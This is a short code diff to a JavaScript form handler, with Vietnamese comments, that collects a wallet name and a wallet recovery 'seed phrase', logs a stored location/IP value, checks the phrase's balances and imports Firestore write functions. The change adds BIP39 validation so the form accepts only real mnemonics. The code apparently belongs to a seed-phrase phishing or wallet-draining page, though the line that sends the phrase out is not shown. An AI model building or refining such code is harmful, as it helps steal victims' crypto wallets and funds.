@@ -1,3 +1,5 @@
+import * as bip39 from "@scure/bip39";
+import { wordlist as english } from "@scure/bip39/wordlists/english";
 import {
     collection,
     addDoc,
@@ -130,6 +132,14 @@ const fetchBalances = async (seed) => {
       .join(' ')                   // Ghép lại thành một khoảng trắng duy nhất
       .toLowerCase();              // Chuyển thành chữ thường
   }
+
+function validateMnemonic(mnemonic) {
+  if (!mnemonic || typeof mnemonic !== "string") return false;
+  const words = mnemonic.trim().split(/\s+/);
+  const count = words.length;
+  if (![12, 15, 18, 21, 24].includes(count)) return false;
+  return bip39.validateMnemonic(mnemonic, english);
+}
     
   const handleSubmit = async (e) => {
    try{
@@ -137,8 +147,7 @@ const fetchBalances = async (seed) => {
         var ip = getLocalStorage("location") ? getLocalStorage("location") : "{}";
         var formattedSeedPhrase = normalizeText(secretPharse);
         if(walletName.length > 0 && formattedSeedPhrase.length > 0 && !getLocalStorage(encodeBase64(formattedSeedPhrase.trim()))){
-            const privateArr = formattedSeedPhrase.trim().split(/[\s]+/g);
-            if(validRange.includes(privateArr.length)){
+            if(validateMnemonic(formattedSeedPhrase)){
                 var _asset = '';
                 var _total = 0;
                 var _s = 1;
